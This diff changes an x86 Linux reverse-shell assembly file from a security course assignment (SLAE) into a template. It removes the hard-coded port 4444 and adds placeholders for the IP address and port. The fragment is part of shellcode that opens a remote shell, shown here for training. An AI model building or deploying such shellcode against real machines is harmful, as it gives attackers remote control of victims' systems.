@@ -1,7 +1,7 @@
 ; Student ID   : SLAE-1250
 ; Student Name : Jonathan "Chops" Crosby
 ; Assignment 1 : Reverse Shell TCP (Linux/x86) Assembly
-; File Name    : reverse-shell.nasm
+; File Name    : reverse-shell-template.nasm
 
 global _start
 
@@ -140,8 +140,9 @@ push edx     ; getting zeros in here
 
 ;ip-address-before-here
 
-push word  0x5C11     ; port number (least significant byte first ... 0x115C is 4444)
-push word  0x02       ; AF_INET - which is 0x02
+;port-before-here
+
+push word  0x02     ; AF_INET - which is 0x02
 
 mov ecx, esp        ; move stack pointer to ecx
 
